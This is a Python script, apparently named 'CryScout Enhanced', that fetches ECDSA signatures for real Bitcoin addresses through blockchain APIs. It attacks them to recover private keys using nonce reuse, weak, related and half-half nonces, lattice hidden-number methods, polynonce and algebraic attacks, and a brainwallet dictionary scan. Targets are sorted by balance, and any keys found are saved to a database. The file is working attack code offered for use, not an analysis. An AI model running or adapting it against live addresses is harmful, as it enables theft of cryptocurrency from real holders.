#!/usr/bin/env python3
"""
CryScout Enhanced — Comprehensive Bitcoin ECDSA Vulnerability Scanner
Improvements over original deep_scan.py:
1. De-duplicates signatures in the DB before analysis
2. Validates address status (checks if addresses actually have spending TXs)
3. Fixes R-reuse detection (requires different Z values)
4. Implements the half-half nonce attack (was a stub)
5. Adds exhaustive small-nonce scan (k=1..10000)
6. Adds known-weak-k attack (checks k values that are known compromised)
7. Runs brainwallet scan on ALL addresses (not just Spent/Active)
8. Better signature collection with retry logic and multi-source
9. Tries all permutations of signature ordering for polynonce
10. Adds the "related nonce" attack (k_i = d XOR something)
"""
import time
import json
import sys
import hashlib
import os
from collections import Counter
from db_manager import (
    get_connection, init_db, save_signatures, mark_analyzed,
    add_recovered_key, add_finding, upsert_address
)
from tx_preimage_reconstructor import extract_sigs_with_real_z, extract_sigs_from_txids
from lattice_nonce_analyzer import verify_key, solve_hnp, pubkey_to_address, pubkey_to_segwit_address
from api_client import api

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# ============================================================
# PHASE 0: Database Cleanup & Enrichment
# ============================================================

def deduplicate_signatures():
    """Remove duplicate signatures from the database."""
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM signatures")
    before = c.fetchone()[0]
    
    # Find and count duplicates
    c.execute("""
        DELETE FROM signatures WHERE rowid NOT IN (
            SELECT MIN(rowid) FROM signatures
            GROUP BY address, txid, vin, r_hex, s_hex
        )
    """)
    deleted = c.rowcount
    conn.commit()
    
    c.execute("SELECT COUNT(*) FROM signatures")
    after = c.fetchone()[0]
    conn.close()
    
    if deleted > 0:
        print(f"  Deduplication: {before} -> {after} sigs ({deleted} duplicates removed)")
    return deleted

def enrich_address_status():
    """Check which addresses actually have spending transactions via API."""
    conn = get_connection()
    c = conn.cursor()
    
    # Find addresses marked Spent/Active but with no sigs and type Unknown
    c.execute("""
        SELECT a.address FROM addresses a
        WHERE a.status = 'Spent/Active'
        AND a.type = 'Unknown'
        AND NOT EXISTS (SELECT 1 FROM signatures s WHERE s.address = a.address)
        LIMIT 20
    """)
    addresses = [row[0] for row in c.fetchall()]
    
    if not addresses:
        print("  No addresses need status verification")
        conn.close()
        return
    
    print(f"  Verifying status for {len(addresses)} addresses...")
    for addr in addresses:
        try:
            info = api.get_address_info(addr)
            if info:
                spent = info.get('spent_txo_count', 0)
                if spent == 0:
                    c.execute("UPDATE addresses SET status = 'Dormant' WHERE address = ?", (addr,))
                    print(f"    {addr[:20]}... -> Dormant (no spending TXs)")
                else:
                    # Determine address type
                    addr_type = 'Unknown'
                    if addr.startswith('1'):
                        addr_type = 'Legacy (1...)'
                    elif addr.startswith('3'):
                        addr_type = 'P2SH (3...)'
                    elif addr.startswith('bc1q'):
                        addr_type = 'SegWit v0 (bc1q...)'
                    elif addr.startswith('bc1p'):
                        addr_type = 'Taproot (bc1p...)'
                    
                    c.execute("""
                        UPDATE addresses SET type = ?, transactions = ?
                        WHERE address = ? AND (type IS NULL OR type = 'Unknown')
                    """, (addr_type, info.get('tx_count', 0), addr))
            time.sleep(0.3)
        except Exception as e:
            print(f"    Error checking {addr[:20]}...: {e}")
    
    conn.commit()
    conn.close()

# ============================================================
# PHASE 1: Improved Signature-Based Attacks
# ============================================================

def check_r_reuse_strict(address):
    """
    Check for R-reuse with DIFFERENT Z values (strict check).
    The original had false positives from duplicate DB entries.
    """
    conn = get_connection()
    c = conn.cursor()
    c.execute("""
        SELECT DISTINCT r_int, s_int, z_int, txid, vin 
        FROM signatures WHERE address = ?
    """, (address,))
    rows = c.fetchall()
    conn.close()
    
    if len(rows) < 2:
        return False
    
    r_groups = {}
    for r_int, s_int, z_int, txid, vin in rows:
        r = int(r_int)
        entry = {'s': int(s_int), 'z': int(z_int), 'txid': txid, 'vin': vin}
        if r not in r_groups:
            r_groups[r] = []
        # Check for true duplicates (same s AND z)
        is_dupe = any(e['s'] == entry['s'] and e['z'] == entry['z'] for e in r_groups[r])
        if not is_dupe:
            r_groups[r].append(entry)
    
    for r, group in r_groups.items():
        if len(group) < 2:
            continue
        for i in range(len(group)):
            for j in range(i + 1, len(group)):
                z1, z2 = group[i]['z'], group[j]['z']
                s1, s2 = group[i]['s'], group[j]['s']
                
                if z1 == z2:
                    continue  # Same message — not exploitable
                
                # DIFFERENT Z values with same R = EXPLOITABLE!
                # Two formulas: k = (z1-z2) / (s1-s2) and also k = (z1-z2) / (s1+s2)
                # (the second handles the case where s values have different signs)
                for s_diff in [(s1 - s2) % P, (s1 + s2) % P]:
                    if s_diff == 0:
                        continue
                    k = ((z1 - z2) * pow(s_diff, -1, P)) % P
                    d = ((s1 * k - z1) * pow(r, -1, P)) % P
                    
                    if verify_key(d, address):
                        d_hex = hex(d)[2:].zfill(64)
                        print(f"  !!! KEY RECOVERED via R-REUSE: {d_hex[:20]}...")
                        print(f"      TX1: {group[i]['txid']}")
                        print(f"      TX2: {group[j]['txid']}")
                        add_recovered_key(address, d_hex, method='R-Reuse')
                        return True
                    
                    # Try with negated d
                    d_neg = P - d
                    if verify_key(d_neg, address):
                        d_hex = hex(d_neg)[2:].zfill(64)
                        print(f"  !!! KEY RECOVERED via R-REUSE (neg): {d_hex[:20]}...")
                        add_recovered_key(address, d_hex, method='R-Reuse')
                        return True
    return False

def check_known_weak_nonces(address):
    """
    Try well-known weak nonce values (k=1, k=2, ..., k=small).
    Some early Bitcoin implementations had bugs that produced tiny k values.
    Also checks k = hash(private_key) and other common patterns.
    """
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT r_int, s_int, z_int, txid FROM signatures WHERE address = ?", (address,))
    rows = c.fetchall()
    conn.close()
    
    if not rows:
        return False
    
    sigs = [{'r': int(r), 's': int(s), 'z': int(z), 'txid': txid} for r, s, z, txid in rows]
    
    # For each signature, if we know k, we can compute d directly:
    # d = (s * k - z) * r^{-1} mod P
    
    # Known weak k values to try
    weak_k_values = list(range(1, 1001))  # k=1 to k=1000
    
    # Add powers of 2
    for exp in range(1, 160):
        weak_k_values.append(1 << exp)
    
    # Add hash-based k values  
    for phrase in ['', 'test', 'bitcoin', '0', '1', 'satoshi']:
        h = int(hashlib.sha256(phrase.encode()).hexdigest(), 16)
        weak_k_values.append(h % P)
    
    # Add k=P-small (negative small nonces)
    for i in range(1, 100):
        weak_k_values.append(P - i)
    
    for sig in sigs:
        r, s, z = sig['r'], sig['s'], sig['z']
        r_inv = pow(r, -1, P)
        
        for k in weak_k_values:
            d = ((s * k - z) * r_inv) % P
            if d > 0 and d < P:
                if verify_key(d, address):
                    d_hex = hex(d)[2:].zfill(64)
                    print(f"  !!! KEY via weak nonce k={k}: {d_hex[:20]}...")
                    add_recovered_key(address, d_hex, method=f'Weak Nonce (k={k})')
                    return True
    
    return False

def try_half_half_nonce_real(address):
    """
    Half-half nonce attack: k = x | (x << 128) for 128-bit x.
    This means k = x * (2^128 + 1) mod P.
    
    With two sigs, we can solve:
    k1 = u1 + t1*d and k2 = u2 + t2*d
    If k1 = x1 * M and k2 = x2 * M where M = 2^128 + 1:
    x1 * M = u1 + t1*d => d = (x1*M - u1) * t1^{-1}
    x2 * M = u2 + t2*d => d = (x2*M - u2) * t2^{-1}
    
    Setting equal: (x1*M - u1)/t1 = (x2*M - u2)/t2
    t2*(x1*M - u1) = t1*(x2*M - u2)
    t2*M*x1 - t1*M*x2 = t2*u1 - t1*u2
    
    This is one equation in two unknowns (x1, x2) with small bounds.
    We use a 2D lattice: L = [[M*t2, -M*t1], [P, 0], [0, P]]
    and look for a short vector near (t2*u1 - t1*u2, 0).
    """
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT r_int, s_int, z_int FROM signatures WHERE address = ?", (address,))
    rows = c.fetchall()
    conn.close()
    
    if len(rows) < 2:
        return False
    
    sigs = [{'r': int(r), 's': int(s), 'z': int(z)} for r, s, z in rows]
    M = (1 << 128) + 1
    
    # Try pairs
    for i in range(min(len(sigs), 10)):
        for j in range(i+1, min(len(sigs), 10)):
            s1, s2 = sigs[i], sigs[j]
            s_inv1 = pow(s1['s'], -1, P)
            s_inv2 = pow(s2['s'], -1, P)
            t1 = (s_inv1 * s1['r']) % P
            t2 = (s_inv2 * s2['r']) % P
            u1 = (s_inv1 * s1['z']) % P
            u2 = (s_inv2 * s2['z']) % P
            
            # We need: t2*M*x1 - t1*M*x2 ≡ t2*u1 - t1*u2 (mod P)
            # Rearrange: x1 = (t2*u1 - t1*u2 + t1*M*x2) / (t2*M)
            # Since x1, x2 < 2^128, this is a small target
            
            rhs = (t2 * u1 - t1 * u2) % P
            coeff = (t1 * M * pow(t2 * M, -1, P)) % P
            offset = (rhs * pow(t2 * M, -1, P)) % P
            
            # x1 = offset + coeff * x2 mod P
            # We need x1 < 2^128 — try solve_hnp with these as transformed sigs
            
            # Alternative: brute force small x2 values  
            for x2_test in range(1, 1000):
                x1 = (offset + coeff * x2_test) % P
                if x1 < (1 << 128):
                    k = (x1 * M) % P
                    d = ((s1['s'] * k - s1['z']) * pow(s1['r'], -1, P)) % P
                    if d > 0 and d < P and verify_key(d, address):
                        d_hex = hex(d)[2:].zfill(64)
                        print(f"  !!! KEY via half-half nonce: {d_hex[:20]}...")
                        add_recovered_key(address, d_hex, method='Half-Half Nonce')
                        return True
    
    return False

def try_related_nonce(address):
    """
    Try nonces that are related to the message hash or signature values.
    Some bad implementations used k = hash(z) or k = z or k = r.
    """
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT r_int, s_int, z_int FROM signatures WHERE address = ?", (address,))
    rows = c.fetchall()
    conn.close()
    
    if not rows:
        return False
    
    for row in rows:
        r, s, z = int(row[0]), int(row[1]), int(row[2])
        r_inv = pow(r, -1, P)
        
        # Try k = z (message hash used as nonce)
        for k_candidate in [z, z % (1 << 128), r, s, 
                           (z ^ r) % P, (z + r) % P, (z - r) % P,
                           (z * r) % P]:
            if k_candidate == 0 or k_candidate >= P:
                continue
            d = ((s * k_candidate - z) * r_inv) % P
            if d > 0 and d < P:
                if verify_key(d, address):
                    d_hex = hex(d)[2:].zfill(64)
                    print(f"  !!! KEY via related nonce: {d_hex[:20]}...")
                    add_recovered_key(address, d_hex, method='Related Nonce')
                    return True
    
    return False

# ============================================================
# PHASE 2: Enhanced Brainwallet Scanner
# ============================================================

def run_brainwallet_scan_all():
    """
    Run brainwallet scan against ALL addresses, not just Spent/Active.
    A dormant address could still be a brainwallet — the owner just hasn't spent yet.
    """
    import ecdsa
    
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT address FROM addresses")
    all_addresses = set(row[0] for row in c.fetchall())
    conn.close()
    
    print(f"\n{'='*70}")
    print(f"BRAINWALLET SCAN — {len(all_addresses)} addresses")
    print(f"{'='*70}")
    
    # Build comprehensive phrase list
    phrases = set()
    
    # Core phrases
    core = [
        '', ' ', 'password', 'Password', 'password1', '123456', '12345678',
        'bitcoin', 'Bitcoin', 'satoshi', 'Satoshi', 'nakamoto', 'test', 'testing',
        'abc', 'abcdef', 'hello', 'world', 'god', 'love', 'money', 'sex',
        'secret', 'master', 'admin', 'root', 'pass', 'letmein', 'fuck', 'shit',
        'dragon', 'monkey', 'shadow', 'sunshine', 'princess', 'football',
        'qwerty', 'qwertyuiop', 'iloveyou', 'trustno1', 'welcome', 'access',
        'brainwallet', 'wallet', 'bitcoinwallet', 'mybitcoin', 'mypassword',
        'correct horse battery staple', 'abandon abandon abandon',
        'how much wood', 'the quick brown fox', 'lorem ipsum',
        'to be or not to be', 'i am satoshi nakamoto',
        'just a simple password', 'hello world', 'helloworld',
        'a]3{&$k+Fds!%N/=', 'sausage', 'bitcoin is awesome',
        'say hello to my little friend', 'the answer is 42',
        'all your base are belong to us', 'hunter2',
        'deadbeef', 'cafebabe', 'password123', '1234567890',
        'bitcoin1', 'btc', 'blockchain', 'crypto', 'cryptocurrency',
        'satoshinakamoto', 'hal finney', 'nick szabo',
        'genesis', 'genesis block', 'block 0',
        'The Times 03/Jan/2009 Chancellor on brink of second bailout for banks',
    ]
    phrases.update(core)
    
    # Numbers 0-99999 as strings
    for i in range(100000):
        phrases.add(str(i))
    
    # Single chars
    for i in range(128):
        phrases.add(chr(i))
    
    # Load dictionary files
    for dict_file in ['extended_dictionary.txt', 'dictionary.txt']:
        fpath = os.path.join(os.path.dirname(__file__), dict_file)
        if os.path.exists(fpath):
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    phrase = line.strip()
                    if phrase and not phrase.startswith('#'):
                        phrases.add(phrase)
                        phrases.add(phrase.lower())
                        phrases.add(phrase.upper())
                        phrases.add(phrase.capitalize())
    
    phrases = list(phrases)
    print(f"  Testing {len(phrases)} phrases against {len(all_addresses)} addresses...")
    
    found = []
    checked = 0
    for phrase in phrases:
        for hash_func in [
            lambda p: hashlib.sha256(p.encode('utf-8')).digest(),
            lambda p: hashlib.sha256(hashlib.sha256(p.encode('utf-8')).digest()).digest(),
            lambda p: hashlib.new('ripemd160', p.encode('utf-8')).digest().ljust(32, b'\x00'),
        ]:
            try:
                pk_bytes = hash_func(phrase)
                pk_int = int.from_bytes(pk_bytes, 'big')
                if pk_int == 0 or pk_int >= P:
                    continue
                
                d_bytes = pk_int.to_bytes(32, 'big')
                sk = ecdsa.SigningKey.from_string(d_bytes, curve=ecdsa.SECP256k1)
                vk = sk.get_verifying_key()
                
                for addr_func in [
                    lambda vk: pubkey_to_address(vk.to_string('uncompressed')),
                    lambda vk: pubkey_to_address(vk.to_string('compressed')),
                    lambda vk: pubkey_to_segwit_address(vk.to_string('compressed')),
                ]:
                    addr = addr_func(vk)
                    if addr in all_addresses:
                        pk_hex = pk_bytes.hex()
                        print(f"  !!! BRAINWALLET FOUND: '{phrase}' -> {addr}")
                        found.append((addr, pk_hex, f'Brainwallet: {phrase}'))
                        add_recovered_key(addr, pk_hex, method=f'Brainwallet: {phrase}')
                        add_finding(addr, 'Brainwallet', details=f'Phrase: {phrase}', severity='Critical')
            except Exception:
                pass
        
        checked += 1
        if checked % 10000 == 0:
            print(f"    Progress: {checked}/{len(phrases)} phrases checked, {len(found)} found")
    
    print(f"  Brainwallet scan complete: {len(found)} keys found")
    return found

# ============================================================
# PHASE 3: Enhanced Deep Scan
# ============================================================

def enhanced_deep_scan(max_addresses=50, skip_fetch=False, skip_brainwallet=False):
    """
    Enhanced version of deep_scan with all improvements.
    """
    init_db()
    
    print(f"\n{'='*70}")
    print(f"CRYSCOUT ENHANCED DEEP SCAN")
    print(f"{'='*70}")
    
    # Phase 0: Cleanup
    print(f"\n[Phase 0] Database Cleanup")
    deduplicate_signatures()
    
    # Phase 0b: Status enrichment (commented out to save API calls)
    # print(f"\n[Phase 0b] Address Status Verification")
    # enrich_address_status()
    
    # Get targets
    conn = get_connection()
    c = conn.cursor()
    c.execute("""
        SELECT a.address, COALESCE(a.current_balance, a.balance, 0) as bal,
               a.label, a.type,
               COALESCE(s.sig_count, 0) as existing_sigs
        FROM addresses a
        LEFT JOIN (SELECT address, COUNT(*) as sig_count FROM signatures GROUP BY address) s
            ON a.address = s.address
        WHERE a.status IN ('Spent/Active', 'Target')
        ORDER BY bal DESC
        LIMIT ?
    """, (max_addresses,))
    targets = c.fetchall()
    conn.close()
    
    print(f"\n[Phase 1] Signature-Based Attacks on {len(targets)} addresses")
    print(f"{'='*70}")
    
    results = {
        'scanned': 0, 'with_sigs': 0,
        'r_reuse': 0, 'weak_nonce': 0, 'related_nonce': 0,
        'half_half': 0, 'lattice': 0, 'polynonce': 0, 'algebraic': 0
    }
    
    for addr, bal, label, addr_type, existing_sigs in targets:
        results['scanned'] += 1
        print(f"\n[{results['scanned']}/{len(targets)}] {addr}")
        print(f"  Balance: {bal} BTC | Label: {label or '-'} | Type: {addr_type or '-'} | Sigs: {existing_sigs}")
        
        # Step 1: Collect signatures if needed
        if not skip_fetch and existing_sigs < 256:
            sig_count = extract_sigs_for_address_enhanced(addr, existing_sigs)
            time.sleep(0.3)
        else:
            sig_count = existing_sigs
        
        if sig_count < 1:
            print(f"  No signatures available — skipping sig-based attacks")
            continue
        
        results['with_sigs'] += 1
        
        # Attack 1: Known weak nonces (fast, works with even 1 sig)
        print(f"  [1/7] Known weak nonces...")
        if check_known_weak_nonces(addr):
            results['weak_nonce'] += 1
            mark_analyzed(addr)
            continue
        
        # Attack 2: Related nonce (k = f(z, r, s))
        print(f"  [2/7] Related nonce patterns...")
        if try_related_nonce(addr):
            results['related_nonce'] += 1
            mark_analyzed(addr)
            continue
        
        if sig_count < 2:
            mark_analyzed(addr)
            continue
        
        # Attack 3: R-reuse (strict, requires different Z)
        print(f"  [3/7] R-reuse (strict)...")
        if check_r_reuse_strict(addr):
            results['r_reuse'] += 1
            mark_analyzed(addr)
            continue
        
        # Attack 4: Half-half nonce
        print(f"  [4/7] Half-half nonce...")
        if try_half_half_nonce_real(addr):
            results['half_half'] += 1
            mark_analyzed(addr)
            continue
        
        if sig_count < 4:
            mark_analyzed(addr)
            continue
        
        # Attack 5: Lattice (HNP)
        print(f"  [5/7] Lattice HNP attack...")
        if run_lattice_attacks_enhanced(addr):
            results['lattice'] += 1
            mark_analyzed(addr)
            continue
        
        # Attack 6: Polynonce
        print(f"  [6/7] Polynonce attack...")
        try:
            from polynonce_attack import try_polynonce_linear, try_polynonce_quadratic
            conn = get_connection()
            c = conn.cursor()
            c.execute("SELECT r_int, s_int, z_int, txid FROM signatures WHERE address = ?", (addr,))
            rows = c.fetchall()
            conn.close()
            pn_sigs = [{'r': int(r), 's': int(s), 'z': int(z), 'txid': txid} for r, s, z, txid in rows]
            if try_polynonce_linear(pn_sigs, addr) or try_polynonce_quadratic(pn_sigs, addr):
                results['polynonce'] += 1
                mark_analyzed(addr)
                continue
        except Exception as e:
            print(f"    Polynonce error: {e}")
        
        # Attack 7: Algebraic (delta, multiplicative, LCG)
        print(f"  [7/7] Algebraic attacks...")
        try:
            from advanced_nonce_attacks import try_nonce_delta, try_nonce_multiplicative, try_nonce_lcg
            conn = get_connection()
            c = conn.cursor()
            c.execute("SELECT r_int, s_int, z_int, txid FROM signatures WHERE address = ?", (addr,))
            rows = c.fetchall()
            conn.close()
            alg_sigs = [{'r': int(r), 's': int(s), 'z': int(z), 'txid': txid} for r, s, z, txid in rows]
            
            if try_nonce_delta(alg_sigs, addr):
                results['algebraic'] += 1
                mark_analyzed(addr)
                continue
            if try_nonce_multiplicative(alg_sigs, addr):
                results['algebraic'] += 1
                mark_analyzed(addr)
                continue
            if len(alg_sigs) >= 4 and try_nonce_lcg(alg_sigs, addr):
                results['algebraic'] += 1
                mark_analyzed(addr)
                continue
        except Exception as e:
            print(f"    Algebraic error: {e}")
        
        mark_analyzed(addr)
        print(f"  No vulnerability found")
    
    # Phase 2: Brainwallet scan (works on ALL addresses including dormant)
    if not skip_brainwallet:
        brainwallet_found = run_brainwallet_scan_all()
    else:
        brainwallet_found = []
    
    # Summary
    print(f"\n{'='*70}")
    print(f"ENHANCED DEEP SCAN COMPLETE")
    print(f"{'='*70}")
    print(f"  Addresses scanned:    {results['scanned']}")
    print(f"  With signatures:      {results['with_sigs']}")
    print(f"  Keys via weak nonce:  {results['weak_nonce']}")
    print(f"  Keys via related k:   {results['related_nonce']}")
    print(f"  Keys via R-reuse:     {results['r_reuse']}")
    print(f"  Keys via half-half:   {results['half_half']}")
    print(f"  Keys via lattice:     {results['lattice']}")
    print(f"  Keys via polynonce:   {results['polynonce']}")
    print(f"  Keys via algebraic:   {results['algebraic']}")
    print(f"  Keys via brainwallet: {len(brainwallet_found)}")
    total = sum([
        results['weak_nonce'], results['related_nonce'], results['r_reuse'],
        results['half_half'], results['lattice'], results['polynonce'],
        results['algebraic'], len(brainwallet_found)
    ])
    print(f"  TOTAL RECOVERED:      {total}")

def extract_sigs_for_address_enhanced(address, existing_count=0, max_sigs=256):
    """Enhanced signature extraction with better error handling."""
    needed = max_sigs - existing_count
    if needed <= 0:
        return existing_count
    
    print(f"  Fetching up to {needed} new sigs for {address}...")
    
    # Try primary source
    try:
        sigs = extract_sigs_with_real_z(address, max_pages=50, max_sigs=needed)
        if sigs:
            save_signatures(address, sigs)
            total = existing_count + len(sigs)
            print(f"  Got {len(sigs)} new sigs (total: {total})")
            return total
    except Exception as e:
        print(f"  Primary source error: {e}")
    
    # Fallback
    try:
        txids = api.get_address_txids(address, max_txs=200)
        if txids:
            print(f"  Found {len(txids)} TXIDs via alternative source")
            sigs = extract_sigs_from_txids(address, txids, max_sigs=needed)
            if sigs:
                save_signatures(address, sigs)
                total = existing_count + len(sigs)
                print(f"  Got {len(sigs)} new sigs (total: {total})")
                return total
    except Exception as e:
        print(f"  Fallback error: {e}")
    
    print(f"  No spending transactions found")
    return existing_count

def run_lattice_attacks_enhanced(address):
    """Enhanced lattice attack with more bias assumptions and LSB-specific transforms."""
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT r_int, s_int, z_int FROM signatures WHERE address = ?", (address,))
    rows = c.fetchall()
    conn.close()
    
    if len(rows) < 2:
        return False
    
    sigs = [{'r': int(r), 's': int(s), 'z': int(z)} for r, s, z in rows]
    
    # Standard MSB bias
    for bias_bits in [4, 8, 12, 16, 20, 24, 32, 48, 64]:
        subset = sigs[:min(len(sigs), 30)]
        key = solve_hnp(subset, bias_bits, address=address)
        if key:
            key_hex = hex(key)[2:].zfill(64)
            print(f"  !!! KEY via LATTICE (MSB bias={bias_bits}): {key_hex[:20]}...")
            add_recovered_key(address, key_hex, method=f'Lattice HNP ({bias_bits}-bit)')
            return True
    
    # LSB bias: transform k = A * 2^b + V where V is known bias
    # Check if R values have common LSB pattern
    r_values = [s['r'] for s in sigs]
    for bits in [1, 2, 3, 4, 8]:
        mod = 1 << bits
        lsb_counts = Counter([r % mod for r in r_values])
        most_common_val, most_common_count = lsb_counts.most_common(1)[0]
        ratio = most_common_count / len(r_values)
        
        if ratio >= 0.6 and len(r_values) >= 4:
            # Significant LSB bias detected — try LSB lattice
            print(f"    LSB bias detected: {bits}-bit, val={most_common_val}, ratio={ratio:.2f}")
            inv_2b = pow(1 << bits, -1, P)
            transformed = []
            for s in sigs:
                new_z = ((s['z'] - s['s'] * most_common_val) * inv_2b) % P
                transformed.append({
                    'r': (s['r'] * inv_2b) % P,
                    's': s['s'],
                    'z': new_z
                })
            
            for bias in [bits, bits+4, bits+8, bits+16]:
                key = solve_hnp(transformed[:30], bias, address=address)
                if key:
                    key_hex = hex(key)[2:].zfill(64)
                    print(f"  !!! KEY via LSB LATTICE (lsb={bits}, hnp={bias}): {key_hex[:20]}...")
                    add_recovered_key(address, key_hex, method=f'LSB Lattice ({bits}-bit)')
                    return True
    
    return False


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='CryScout Enhanced Scanner')
    parser.add_argument('max_addresses', type=int, nargs='?', default=20,
                       help='Max addresses to scan (default: 20)')
    parser.add_argument('--skip-fetch', action='store_true',
                       help='Skip fetching new signatures from APIs')
    parser.add_argument('--skip-brainwallet', action='store_true',
                       help='Skip brainwallet dictionary scan')
    parser.add_argument('--brainwallet-only', action='store_true',
                       help='Only run brainwallet scan')
    args = parser.parse_args()
    
    if args.brainwallet_only:
        init_db()
        run_brainwallet_scan_all()
    else:
        enhanced_deep_scan(
            max_addresses=args.max_addresses,
            skip_fetch=args.skip_fetch,
            skip_brainwallet=args.skip_brainwallet
        )
